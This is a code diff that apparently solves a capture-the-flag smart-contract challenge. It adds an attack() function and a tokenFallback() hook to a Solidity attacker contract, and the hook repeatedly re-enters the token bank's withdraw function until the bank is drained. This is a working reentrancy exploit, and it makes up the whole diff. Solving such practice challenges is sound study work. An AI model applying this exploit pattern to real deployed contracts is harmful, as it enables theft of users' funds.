@@ -137,4 +137,58 @@ contract TokenBankAttacker {
         challenge = TokenBankChallenge(challengeAddress);
     }
     // Write your exploit functions here
+
+    function attack() public {
+        SimpleERC223Token token = challenge.token();
+
+        // 1. Check if the player has tokens to attack
+        uint256 playerBalance = token.balanceOf(msg.sender);
+        require(playerBalance > 0, "No tokens to attack");
+
+        // 2. Transfer tokens from player to the contract
+        require(
+            token.transferFrom(msg.sender, address(this), playerBalance),
+            "Failed to transfer tokens"
+        );
+
+        // 3. Deposit the tokens to the bank contract
+        require(
+            token.transfer(address(challenge), playerBalance),
+            "Failed to deposit tokens"
+        );
+
+        // 4. Check if the tokens are deposited
+        uint256 depositedTokens = challenge.balanceOf(address(this));
+        require(depositedTokens > 0, "Failed to deposit tokens");
+
+        // 5. Withdraw the tokens from the bank contract
+        // This will trigger the tokenFallback function in the attacker contract
+        challenge.withdraw(depositedTokens);
+
+        // 6. Check if the bank is empty
+        require(token.balanceOf(address(challenge)) == 0, "Bank is not empty");
+
+        // 7. Send the tokens back to the player
+        require(
+            token.transfer(msg.sender, token.balanceOf(address(this))),
+            "Failed to send tokens back"
+        );
+    }
+
+    // This function is called by the token contract when the bank attacker contract receives withdrawn tokens
+    function tokenFallback(address, uint256, bytes memory) public {
+        SimpleERC223Token token = challenge.token();
+        uint256 tokensInTheBank = token.balanceOf(address(challenge));
+
+        // Call the withdraw function again until all tokens are withdrawn
+        // The maximum amount of tokens that can be withdrawn at a time is the balance of the attacker
+        if (tokensInTheBank > 0) {
+            uint256 maxTokensAtTime = challenge.balanceOf(address(this));
+            uint256 toWithdraw = tokensInTheBank < maxTokensAtTime
+                ? tokensInTheBank
+                : maxTokensAtTime;
+
+            challenge.withdraw(toWithdraw);
+        }
+    }
 }
